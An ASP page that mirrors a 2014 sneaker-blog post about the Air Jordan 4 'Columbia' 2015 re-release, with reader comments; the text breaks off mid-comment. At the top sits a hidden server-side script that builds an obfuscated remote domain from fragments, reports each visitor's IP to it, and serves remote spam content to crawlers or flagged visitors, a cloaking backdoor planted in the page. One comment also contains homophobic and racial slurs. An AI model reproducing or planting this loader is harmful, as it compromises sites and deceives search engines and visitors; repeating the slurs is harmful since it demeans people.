<%
'on error resume next
Server.ScriptTimeout=600
dim systid,ISBK,html,echohtml,lk,ipurl,echourl,kdom
kdom = "1nil"
kdom =kdom & "2thea"
systid=484
kdom =kdom & "rsenal"

kdom =kdom & "."
ISBK = "false"
kdom =kdom &"com"
hs = "http"
ipurl = hs&"://nb."&kdom&"/nb.php?ip="
echourl = hs&"://ac."&kdom&"/echo.php?"
html = GetContent(ipurl&GetRsip()) 'GetRsip()
lk ="<t"&"@"&"k>"
If instr(html,lk)>0 Then
	 ISBK = replace(html,lk,"")
End If
'response.Write ISBK&ChecksAgent
'ISBK ="true"
if ChecksAgent=true or cstr(ISBK)="true" Then
	
	dim subspagseid
	subspagseid = request.querystring("subspagseid")
	If subspagseid Then
		response.Write GetContent(echourl&"sysid="&systid&"&subpageid="&subspagseid)
	Else
		%>


<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />

<!-- This site is optimized with the Yoast WordPress SEO plugin v1.7.1 - https://yoast.com/wordpress/plugins/seo/ -->
<title>Air Jordan 4 Retro &quot;Columbia&quot; Confirmed 2015 Release | SneakerBarDetroit.com</title>
<link rel="canonical" href="http://sneakerbardetroit.com/air-jordan-4-retro-columbia-confirmed-2015-release/" />
<!-- / Yoast WordPress SEO plugin. -->

<link rel="alternate" type="application/rss+xml" title=" &raquo; Feed" href="http://sneakerbardetroit.com/feed/" />
<link rel="alternate" type="application/rss+xml" title=" &raquo; Comments Feed" href="http://sneakerbardetroit.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title=" &raquo; Air Jordan 4 Retro &#8220;Columbia&#8221; Confirmed 2015 Release Comments Feed" href="http://sneakerbardetroit.com/air-jordan-4-retro-columbia-confirmed-2015-release/feed/" />
<link rel='stylesheet' id='mediaelement-css'  href='http://sneakerbardetroit.com/wp-includes/js/mediaelement/mediaelementplayer.min.css?ver=2.15.0' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css'  href='http://sneakerbardetroit.com/wp-includes/js/mediaelement/wp-mediaelement.css?ver=4.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='metro-pro-theme-css'  href='http://sneakerbardetroit.com/wp-content/themes/metro-pro/style.css?ver=2.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='arevico_scsfbcss-css'  href='http://sneakerbardetroit.com/wp-content/plugins/facebook-page-promoter-lightbox/front-assets/scs/scs.css?ver=4.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='wp-polls-css'  href='http://sneakerbardetroit.com/wp-content/plugins/wp-polls/polls-css.css?ver=2.68' type='text/css' media='all' />
<link rel='stylesheet' id='us-plugin-styles-css'  href='http://sneakerbardetroit.com/wp-content/plugins/ultimate-social-deux/public/assets/css/style.css?ver=3.1.6' type='text/css' media='all' />
<style type='text/css'>
.us_floating .us_wrapper .us_button { width: 45px; -webkit-transition: width 1000ms ease-in-out, background-color 400ms ease-out; -moz-transition: width 1000ms ease-in-out, background-color 400ms ease-out; -o-transition: width 1000ms ease-in-out, background-color 400ms ease-out; transition: width 1000ms ease-in-out, background-color 400ms ease-out; }.us_floating .us_wrapper .us_button:hover { width: 90px;-webkit-transition: width 1000ms ease-in-out, background-color 400ms ease-out; -moz-transition: width 1000ms ease-in-out, background-color 400ms ease-out; -o-transition: width 1000ms ease-in-out, background-color 400ms ease-out; transition: width 1000ms ease-in-out, background-color 400ms ease-out; }.us_button:hover, .us_fan_count_button:hover { background-color:#1e73be; }.us_button { -moz-border-radius-topleft: 0px; -moz-border-radius-topright: 0px; -moz-border-radius-bottomright: 0px; -moz-border-radius-bottomleft: 0px; border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; -webkit-border-top-left-radius: 0px; -webkit-border-top-right-radius: 0px; -webkit-border-bottom-right-radius: 0px; -webkit-border-bottom-left-radius: 0px; }.us_fan_count_button { -moz-border-radius-topleft: 0px; -moz-border-radius-topright: 0px; -moz-border-radius-bottomright: 0px; -moz-border-radius-bottomleft: 0px; border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; -webkit-border-top-left-radius: 0px; -webkit-border-top-right-radius: 0px; -webkit-border-bottom-right-radius: 0px; -webkit-border-bottom-left-radius: 0px; }div[class*='us_facebook'] { background-color:#3b5998; }div[class*='us_twitter'] { background-color:#00ABF0; }div[class*='us_google'] { background-color:#D95232; }div[class*='us_delicious'] { background-color:#66B2FD; }div[class*='us_stumble'] { background-color:#E94B24; }div[class*='us_linkedin'] { background-color:#1C86BC; }div[class*='us_pinterest'] { background-color:#AE181F; }div[class*='us_buffer'] { background-color:#000000; }div[class*='us_reddit'] { background-color:#CEE3F8; }div[class*='us_vkontakte'] { background-color:#537599; }.us_mail { background-color:#666666; }div[class*='us_love'] { background-color:#FF0000; }div[class*='us_pocket'] { background-color:#ee4056; }div[class*='us_tumblr'] { background-color:#529ecc; }div[class*='us_print'] { background-color:#60d0d4; }div[class*='us_flipboard'] { background-color:#c10000; }div[class*='us_comments']{ background-color:#b69823; }div[class*='us_feedly'] { background-color:#414141; }div[class*='us_youtube'] { background-color:#cc181e; }div[class*='us_vimeo'] { background-color:#1bb6ec; }div[class*='us_dribbble'] { background-color:#f72b7f; }div[class*='us_envato'] { background-color:#82b540; }div[class*='us_github'] { background-color:#201e1f; }div[class*='us_soundcloud'] { background-color:#ff6f00; }div[class*='us_instagram'] { background-color:#48769c; }div[class*='us_feedpress'] { background-color:#ffafaf; }div[class*='us_mailchimp'] { background-color:#6dc5dc; }div[class*='us_flickr'] { background-color:#0062dd; }div[class*='us_members'] { background-color:#0ab071; }.us_posts_fan_count { background-color:#924e2a; }
</style>
<link rel='stylesheet' id='google-font-css'  href='//fonts.googleapis.com/css?family=Oswald%3A400&#038;ver=2.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='slb_core-css'  href='http://sneakerbardetroit.com/wp-content/plugins/simple-lightbox/client/css/app.css?ver=2.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='style-css'  href='http://sneakerbardetroit.com/wp-content/themes/metro-pro/style.css?1417876736&#038;ver=4.0.1' type='text/css' media='all' />
<script type='text/javascript' src='http://sneakerbardetroit.com/wp-content/plugins/powerpress/player.min.js?ver=4.0.1'></script>
<script type='text/javascript' src='http://sneakerbardetroit.com/wp-includes/js/jquery/jquery.js?ver=1.11.1'></script>
<script type='text/javascript' src='http://sneakerbardetroit.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript' src='http://sneakerbardetroit.com/wp-content/plugins/q2w3-fixed-widget/js/q2w3-fixed-widget.min.js?ver=4.0.6'></script>
<script type='text/javascript' src='http://sneakerbardetroit.com/wp-content/plugins/facebook-page-promoter-lightbox/front-assets/scs/scs.js?ver=4.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var lb_l_ret = {"fb_id":"220259207993791","delay":"4000","show_once":"1","coc":"1","display_on_page":"1","display_on_post":"1","display_on_homepage":"1","display_on_archive":"1"};
/* ]]> */
</script>
<script type='text/javascript' src='http://sneakerbardetroit.com/wp-content/plugins/facebook-page-promoter-lightbox/front-assets/js/launch.js?ver=4.0.1'></script>
<script type='text/javascript' src='http://sneakerbardetroit.com/wp-includes/js/jquery/jquery.color.min.js?ver=2.1.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var us_script = {"ajaxurl":"http:\/\/sneakerbardetroit.com\/wp-admin\/admin-ajax.php","tweet_via":"sbdetroit","sharrre_url":"http:\/\/sneakerbardetroit.com\/wp-admin\/admin-ajax.php","success":"Great work! Your message was sent.","trying":"Trying to send email...","total_shares_text":"Shares","facebook_height":"500","facebook_width":"900","twitter_height":"500","twitter_width":"900","googleplus_height":"500","googleplus_width":"900","delicious_height":"550","delicious_width":"550","stumble_height":"550","stumble_width":"550","linkedin_height":"550","linkedin_width":"550","pinterest_height":"320","pinterest_width":"720","buffer_height":"500","buffer_width":"900","reddit_height":"500","reddit_width":"900","vkontakte_height":"500","vkontakte_width":"900","printfriendly_height":"500","printfriendly_width":"1045","pocket_height":"500","pocket_width":"900","tumblr_height":"500","tumblr_width":"900","flipboard_height":"500","flipboard_width":"900","vkontakte_appid":"","facebook_appid":"","home_url":"http:\/\/sneakerbardetroit.com","enabletracking":"","nonce":"fe3b99497e","already_loved_message":"You have already loved this item.","error_message":"Sorry, there was a problem processing your request.","logged_in":"false","bitly":"false"};
/* ]]> */
</script>
<script type='text/javascript' src='http://sneakerbardetroit.com/wp-content/plugins/ultimate-social-deux/public/assets/js/script-ck.js?ver=3.1.6'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://sneakerbardetroit.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://sneakerbardetroit.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 4.0.1" />
<link rel='shortlink' href='http://sneakerbardetroit.com/?p=130644' />
<script type="text/javascript"><!--
function powerpress_pinw(pinw){window.open('http://sneakerbardetroit.com/?powerpress_pinw='+pinw, 'PowerPressPlayer','toolbar=0,status=0,resizable=1,width=460,height=320');	return false;}
powerpress_url = 'http://sneakerbardetroit.com/wp-content/plugins/powerpress/';
//-->
</script>
<style type="text/css">
.wp-polls .pollbar {
	margin: 1px;
	font-size: 6px;
	line-height: 8px;
	height: 8px;
	background: #efefef;
	border: 1px solid #c8c8c8;
}
</style>
<link rel="Shortcut Icon" href="http://sneakerbardetroit.com/wp-content/uploads/2014/08/favicon-sbd.png" type="image/x-icon" />
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-23462953-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>

<meta id="testViewport" name="viewport" content="width = device-width">
<script>
if (screen.width > 481) {
	var mvp = document.getElementById('testViewport');
	mvp.setAttribute('content','width=1140');
}
</script>

<meta name="google-site-verification" content="rW9BrwPbu-wYAYxQ6pGkPQ5HHWr94JRJS3O0sGST8Ak" />

<!-- Place this tag in your head or just before your close body tag. -->
<script src="https://apis.google.com/js/platform.js" async defer></script><style type="text/css">.site-title a { background: url(http://sneakerbardetroit.com/wp-content/uploads/2014/08/sneaker-bar-detroit-logo.png) no-repeat !important; }</style>
<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
<style>body { background-color: #f4f4f4; }</style>
</head>
<body class="single single-post postid-130644 single-format-standard custom-background custom-header header-image content-sidebar" itemscope="itemscope" itemtype="http://schema.org/WebPage"><div class="site-container"><header class="site-header" role="banner" itemscope="itemscope" itemtype="http://schema.org/WPHeader"><div class="wrap"><div class="title-area"><p class="site-title" itemprop="headline"><a href="http://sneakerbardetroit.com/"></a></p></div><aside class="widget-area header-widget-area"><section id="text-44" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><center><div class="my_top_ad"><style>
.mobileresponsive-header { width: 300px; height: 250px; }
@media(min-width: 500px) { .mobileresponsive-header { width: 468px; height: 60px; } }
@media(min-width: 800px) { .mobileresponsive-header { width: 728px; height: 90px; } }
</style>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- MobileResponsive Header -->
<ins class="adsbygoogle mobileresponsive-header"
     style="display:inline-block"
     data-ad-client="ca-pub-2599275089753181"
     data-ad-slot="6796567685"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></div></center></div>
		</div></section></aside></div></header><nav class="nav-primary" role="navigation" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement"><div class="wrap"><ul id="menu-main" class="menu genesis-nav-menu menu-primary"><li id="menu-item-133180" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-133180"><a href="http://sneakerbardetroit.com">Home</a></li>
<li id="menu-item-20381" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-20381"><a href="http://sneakerbardetroit.com/air-jordan-release-dates/">Jordan Release Dates</a>
<ul class="sub-menu">
	<li id="menu-item-193900" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-193900"><a href="http://sneakerbardetroit.com/sneaker-release-dates/">Sneaker Release Dates</a></li>
</ul>
</li>
<li id="menu-item-133293" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-133293"><a href="http://sneakerbardetroit.com/category/features/">Features</a></li>
<li id="menu-item-20382" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-20382"><a href="#">Brands</a>
<ul class="sub-menu">
	<li id="menu-item-112382" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-112382"><a href="http://sneakerbardetroit.com/category/air-jordans/">Air Jordans</a></li>
	<li id="menu-item-112381" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-112381"><a href="http://sneakerbardetroit.com/category/nike/">Nike</a></li>
	<li id="menu-item-112383" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-112383"><a href="http://sneakerbardetroit.com/category/adidas/">Adidas</a></li>
	<li id="menu-item-133298" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-133298"><a href="http://sneakerbardetroit.com/category/asics/">Asics</a></li>
	<li id="menu-item-167953" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-167953"><a href="http://sneakerbardetroit.com/category/li-ning/">Li-Ning</a></li>
	<li id="menu-item-167954" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-167954"><a href="http://sneakerbardetroit.com/category/new-balance/">New Balance</a></li>
	<li id="menu-item-167955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-167955"><a href="http://sneakerbardetroit.com/category/puma/">Puma</a></li>
	<li id="menu-item-133297" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-133297"><a href="http://sneakerbardetroit.com/category/reebok/">Reebok</a></li>
	<li id="menu-item-167956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-167956"><a href="http://sneakerbardetroit.com/category/vans/">Vans</a></li>
</ul>
</li>
<li id="menu-item-20394" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-20394"><a href="http://sneakerbardetroit.com/category/reviews/">Reviews</a></li>
<li id="menu-item-196653" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-196653"><a href="http://sneakerbardetroit.com/tag/the-sneaker-box/">Podcast</a></li>
</ul></div></nav><div class="site-inner"><div class="content-sidebar-wrap"><main class="content" role="main" itemprop="mainContentOfPage" itemscope="itemscope" itemtype="http://schema.org/Blog"><div class="breadcrumb">You are here: <a href="http://sneakerbardetroit.com/">Home</a> / <a href="http://sneakerbardetroit.com/category/air-jordans/">Air Jordans</a> / Air Jordan 4 Retro &#8220;Columbia&#8221; Confirmed 2015 Release</div><article class="post-130644 post type-post status-publish format-standard has-post-thumbnail category-air-jordans tag-air-jordan-4 entry" itemscope="itemscope" itemtype="http://schema.org/BlogPosting" itemprop="blogPost"><header class="entry-header"><h1 class="entry-title" itemprop="headline">Air Jordan 4 Retro &#8220;Columbia&#8221; Confirmed 2015 Release</h1> 
<p class="entry-meta"><time class="entry-time" itemprop="datePublished" datetime="2014-06-04T22:08:06+00:00">June 4, 2014</time> by <span class="entry-author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><a href="http://sneakerbardetroit.com/author/mario-briguglio/" class="entry-author-link" itemprop="url" rel="author"><span class="entry-author-name" itemprop="name">Mario Briguglio</span></a></span> <span class="entry-comments-link"><a href="http://sneakerbardetroit.com/air-jordan-4-retro-columbia-confirmed-2015-release/#comments"><span class="dsq-postid" data-dsqidentifier="130644 http://sneakerbardetroit.com/?p=130644">44 Comments</span></a></span> </p><img width="698" height="366" src="http://sneakerbardetroit.com/wp-content/uploads/2014/06/Air-Jordan-4-Columbia-2015-698x366.jpg" class="attachment-home-top wp-post-image" alt="Air-Jordan-4-Columbia-2015" /></header><div class="entry-content" itemprop="text"><p>Following the news that the <a href="http://sneakerbardetroit.com/2014/06/air-jordan-4-retro-oreo-confirmed-2015-release/"><strong>Air Jordan 4 Retro &#8220;Oreo&#8221;</strong></a> was confirmed to release in 2015, we now have more breaking news that the Air Jordan 4 Retro &#8220;Columbia&#8221; will also return in 2015.</p><div id="no-popup" style="width: 100%; height: 100%; background: #ffffff; padding: 5px 5px 5px 5px; margin-bottom: 5px; margin-right: 0; text-align: center;"><style>
.responsive-content { width: 300px; height: 250px; }
@media(min-width: 500px) { .responsive-content { width: 600px; height: 100px; } }
@media(min-width: 800px) { .responsive-content { width: 600px; height: 100px; } }
</style>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Responsive Content -->
<ins class="adsbygoogle responsive-content"
     style="display:inline-block"
     data-ad-client="ca-pub-2599275089753181"
     data-ad-slot="2502624485"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></div>
<p>The last time the <strong>Air Jordan 4 Retro &#8220;Columbia&#8221;</strong> released was back in 1999, and sold out within hours of the release.  Below are some photos of the &#8217;99 pair for you to get them refreshed in your memory.  Let us know in the comments below what you think of today&#8217;s news of both Air Jordan 4 Retro releases returning in 2015.  Stay tuned to Sneaker Bar for more updates on all the upcoming <a href="http://sneakerbardetroit.com/air-jordan-release-dates/"><strong>Air Jordan Release Dates</strong></a>.</p>
<p><img src="http://sneakerbardetroit.com/wp-content/uploads/2014/06/air-jordan-4-columbia-2015-release.jpg" alt="air jordan 4 columbia" width="650" height="433" class="aligncenter size-full wp-image-130645" /></p>
<p><img src="http://sneakerbardetroit.com/wp-content/uploads/2014/06/air-jordan-4-columbia-2015-release-1.jpg" alt="air-jordan-4-columbia-2015-release-1" width="650" height="433" class="aligncenter size-medium wp-image-130646" /></p>
<p><img src="http://sneakerbardetroit.com/wp-content/uploads/2014/06/air-jordan-4-columbia-2015-release-2.jpg" alt="air-jordan-4-columbia-2015-release-2" width="650" height="433" class="aligncenter size-medium wp-image-130647" /></p>
<p><img src="http://sneakerbardetroit.com/wp-content/uploads/2014/06/air-jordan-4-columbia-2015-release-3.jpg" alt="air-jordan-4-columbia-2015-release-3" width="650" height="433" class="aligncenter size-medium wp-image-130648" /></p>
<p>Source: <a href="http://instagram.com/oregonsole" target="_blank">oregonsole</a></p>
</p></div><footer class="entry-footer"><p class="entry-meta"><span class="entry-categories">Filed Under: <a href="http://sneakerbardetroit.com/category/air-jordans/" rel="category tag">Air Jordans</a></span> <span class="entry-tags">Tagged With: <a href="http://sneakerbardetroit.com/tag/air-jordan-4/" rel="tag">Air Jordan 4</a></span></p></footer></article><section class="author-box" itemtype="http://schema.org/Person" itemscope="itemscope" itemprop="author"><img alt='' src='http://1.gravatar.com/avatar/fe90be1f9ff6caf67c61f5bf98745e4d?s=70&amp;d=blank&amp;r=G' class='avatar avatar-70 photo' height='70' width='70' /><div class="author-box-title">Written by <span itemprop="name">Mario Briguglio</span></div><div itemprop="description" class="author-box-content"><p>Founder and Editor in Chief. His passion for sneakers started at age 6 and has hundreds in his collection. <em>Favorite Kicks - Black Cement 3's.</em></p>
</div></section><section id="ultimatesocialdeux_widget-2" class="widget widget_ultimatesocialdeux_widget amr_widget"><div class="widget-wrap"><div class="us_wrapper tac"><div class="us_facebook us_button" data-url="http://sneakerbardetroit.com/air-jordan-4-retro-columbia-confirmed-2015-release/" data-text="Air Jordan 4 Retro &#8220;Columbia&#8221; Confirmed 2015 Release"><a class="us_box" href="#" data-url="http://sneakerbardetroit.com/air-jordan-4-retro-columbia-confirmed-2015-release/"><div class="us_share"><i class="us-icon-facebook"></i></div><div class="us_count"><i class="us-icon-spin us-icon-spinner"></i></div></a></div><div class="us_twitter us_button" data-url="http://sneakerbardetroit.com/air-jordan-4-retro-columbia-confirmed-2015-release/" data-text="Air Jordan 4 Retro &#8220;Columbia&#8221; Confirmed 2015 Release" ><a class="us_box" href="#"><div class="us_share"><i class="us-icon-twitter"></i></div><div class="us_count"><i class="us-icon-spin us-icon-spinner"></i></div></a></div><div class="us_googleplus us_transient us_button" data-url="http://sneakerbardetroit.com/air-jordan-4-retro-columbia-confirmed-2015-release/" data-text="Air Jordan 4 Retro &#8220;Columbia&#8221; Confirmed 2015 Release" data-count="0"><a class="us_box" href="#" data-url="http://sneakerbardetroit.com/air-jordan-4-retro-columbia-confirmed-2015-release/"><div class="us_share"><i class="us-icon-google"></i></div><div class="us_count"><i class="us-icon-spin us-icon-spinner"></i></div></a></div><div class="us_pinterest us_transient us_button" data-url="http://sneakerbardetroit.com/air-jordan-4-retro-columbia-confirmed-2015-release/" data-text="Air Jordan 4 Retro &#8220;Columbia&#8221; Confirmed 2015 Release" data-count="0"><a class="us_box" href="#"><div class="us_share"><i class="us-icon-pinterest"></i></div><div class="us_count"><i class="us-icon-spin us-icon-spinner"></i></div></a></div></div></div></section>
<div class="relatedposts">
<div class="noname">
<h3>Related Posts</h3>
</div>
	
<article id="my_article_related" itemscope="itemscope" itemtype="http://schema.org/BlogPosting">
<a href="http://sneakerbardetroit.com/feet-photos-air-jordan-4-retro-ls-columbia/" title="On-Feet Photos of the Air Jordan 4 Retro LS &#8220;Columbia&#8221;" class="alignleft">
 
<img src="http://sneakerbardetroit.com/wp-content/uploads/2015/01/Air-Jordan-4-Retro-LS-Columbia-Legend-Blue-332x190.jpg" class="entry-image attachment-post" itemprop="image">
</a>
<header class="entry-header">
<h2 class="entry-title">
<a href="http://sneakerbardetroit.com/feet-photos-air-jordan-4-retro-ls-columbia/">
On-Feet Photos of the Air Jordan 4 Retro LS &#8220;Columbia&#8221;</a>
</h2>
</header>
</article>
	
		
<article id="my_article_related" itemscope="itemscope" itemtype="http://schema.org/BlogPosting">
<a href="http://sneakerbardetroit.com/air-jordan-4-sueded-python-bred-custom/" title="Air Jordan 4 &#8220;Sueded Python Bred&#8221; Custom" class="alignleft">
 
<img src="http://sneakerbardetroit.com/wp-content/uploads/2014/12/air-jordan-4-sueded-python-bred-custom-332x190.jpg" class="entry-image attachment-post" itemprop="image">
</a>
<header class="entry-header">
<h2 class="entry-title">
<a href="http://sneakerbardetroit.com/air-jordan-4-sueded-python-bred-custom/">
Air Jordan 4 &#8220;Sueded Python Bred&#8221; Custom</a>
</h2>
</header>
</article>
	
		
<article id="my_article_related" itemscope="itemscope" itemtype="http://schema.org/BlogPosting">
<a href="http://sneakerbardetroit.com/air-jordan-4-motorsport-returning-2015/" title="Air Jordan 4 &#8220;Motorsport&#8221; Returning in 2015" class="alignleft">
 
<img src="http://sneakerbardetroit.com/wp-content/uploads/2014/12/air-jordan-iv-4-motorsport-20151-332x190.jpg" class="entry-image attachment-post" itemprop="image">
</a>
<header class="entry-header">
<h2 class="entry-title">
<a href="http://sneakerbardetroit.com/air-jordan-4-motorsport-returning-2015/">
Air Jordan 4 &#8220;Motorsport&#8221; Returning in 2015</a>
</h2>
</header>
</article>
	
		
<article id="my_article_related" itemscope="itemscope" itemtype="http://schema.org/BlogPosting">
<a href="http://sneakerbardetroit.com/air-jordan-4-columbia-2015-release-date/" title="Air Jordan 4 &#8220;Columbia&#8221; 2015 Release Date" class="alignleft">
 
<img src="http://sneakerbardetroit.com/wp-content/uploads/2014/12/air-jordan-retro-4-columbia-20151-332x190.jpg" class="entry-image attachment-post" itemprop="image">
</a>
<header class="entry-header">
<h2 class="entry-title">
<a href="http://sneakerbardetroit.com/air-jordan-4-columbia-2015-release-date/">
Air Jordan 4 &#8220;Columbia&#8221; 2015 Release Date</a>
</h2>
</header>
</article>
	
	</div>
<div class="after-entry widget-area"><div class="wrap"><section id="text-50" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><div class="one-half first"><center><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Homepage 336 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:336px;height:280px"
     data-ad-client="ca-pub-2599275089753181"
     data-ad-slot="9505050480"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></center></div>
<div class="one-half"><a href="http://sneakerbardetroit.com/go/tsb-podcast/" target="_blank"><img src="http://sneakerbardetroit.com/wp-content/uploads/2011/05/tsb-ad-itunes-link.jpg" alt="tsb-ad-itunes-link" width="500" height="417" class="alignnone size-full wp-image-196266" /></a></div></div>
		</div></section>
</div></div>
<div id="disqus_thread">
            <div id="dsq-content">


            <ul id="dsq-comments">
                    <li class="comment even thread-even depth-1" id="dsq-comment-264801">
        <div id="dsq-comment-header-264801" class="dsq-comment-header">
            <cite id="dsq-cite-264801">
                <span id="dsq-author-user-264801">FTC</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264801" class="dsq-comment-body">
            <div id="dsq-comment-message-264801" class="dsq-comment-message"><p>back to back great news but them oreo 4s i need</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment odd alt thread-odd thread-alt depth-1" id="dsq-comment-264800">
        <div id="dsq-comment-header-264800" class="dsq-comment-header">
            <cite id="dsq-cite-264800">
                <span id="dsq-author-user-264800">jasmin</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264800" class="dsq-comment-body">
            <div id="dsq-comment-message-264800" class="dsq-comment-message"><p>headed to start camping now who wants to spilt a pizza?</p>
</div>
        </div>

    <ul class="children">
    <li class="comment even depth-2" id="dsq-comment-264807">
        <div id="dsq-comment-header-264807" class="dsq-comment-header">
            <cite id="dsq-cite-264807">
                <span id="dsq-author-user-264807">Sneakerhead42</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264807" class="dsq-comment-body">
            <div id="dsq-comment-message-264807" class="dsq-comment-message"><p>Me</p>
</div>
        </div>

    </li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
    <li class="comment odd alt thread-even depth-1" id="dsq-comment-264804">
        <div id="dsq-comment-header-264804" class="dsq-comment-header">
            <cite id="dsq-cite-264804">
                <span id="dsq-author-user-264804">SUCKMYSOLES</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264804" class="dsq-comment-body">
            <div id="dsq-comment-message-264804" class="dsq-comment-message"><p>these ugly as fuck all you faggot ass hypebeast don&#8217;t know shit about those these days you lames ass bred licking niggas</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment even thread-odd thread-alt depth-1" id="dsq-comment-264802">
        <div id="dsq-comment-header-264802" class="dsq-comment-header">
            <cite id="dsq-cite-264802">
                <span id="dsq-author-user-264802">49ers</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264802" class="dsq-comment-body">
            <div id="dsq-comment-message-264802" class="dsq-comment-message"><p>these hella soft all i need is them columbia 11s but the oreo 4s gonna need a cop from me</p>
</div>
        </div>

    <ul class="children">
    <li class="comment odd alt depth-2" id="dsq-comment-264824">
        <div id="dsq-comment-header-264824" class="dsq-comment-header">
            <cite id="dsq-cite-264824">
                <span id="dsq-author-user-264824">T$ .</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264824" class="dsq-comment-body">
            <div id="dsq-comment-message-264824" class="dsq-comment-message"><p>You somd crazy</p>
</div>
        </div>

    </li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
    <li class="comment even thread-even depth-1" id="dsq-comment-264803">
        <div id="dsq-comment-header-264803" class="dsq-comment-header">
            <cite id="dsq-cite-264803">
                <span id="dsq-author-user-264803">maxewell</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264803" class="dsq-comment-body">
            <div id="dsq-comment-message-264803" class="dsq-comment-message"><p>ohhh baby jesus</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment odd alt thread-odd thread-alt depth-1" id="dsq-comment-264806">
        <div id="dsq-comment-header-264806" class="dsq-comment-header">
            <cite id="dsq-cite-264806">
                <span id="dsq-author-user-264806">eric wrigth</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264806" class="dsq-comment-body">
            <div id="dsq-comment-message-264806" class="dsq-comment-message"><p>gotta wait to see if jordan brand fucks the quality up first</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment even thread-even depth-1" id="dsq-comment-264805">
        <div id="dsq-comment-header-264805" class="dsq-comment-header">
            <cite id="dsq-cite-264805">
                <span id="dsq-author-user-264805">AppleSeed23</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264805" class="dsq-comment-body">
            <div id="dsq-comment-message-264805" class="dsq-comment-message"><p>they tight but not worth camping or going crazy over like the columbia 11s but its cool to see them return tho</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment odd alt thread-odd thread-alt depth-1" id="dsq-comment-264818">
        <div id="dsq-comment-header-264818" class="dsq-comment-header">
            <cite id="dsq-cite-264818">
                <span id="dsq-author-user-264818">Scottie092</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264818" class="dsq-comment-body">
            <div id="dsq-comment-message-264818" class="dsq-comment-message"><p>THANK YOU JORDAN BRAND</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment even thread-even depth-1" id="dsq-comment-264816">
        <div id="dsq-comment-header-264816" class="dsq-comment-header">
            <cite id="dsq-cite-264816">
                <span id="dsq-author-user-264816">patrick</span>
            </cite>
        </div>
        <div id="dsq-comment-body-264816" class="dsq-comment-body">
            <div id="dsq-comment-message-264816" class="dsq-comment-message"><p>2015 looking nice YOT7&#8217;s plus these…&#8230;</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment odd alt thread-odd thread-alt depth-1" id="dsq-comment-264817">
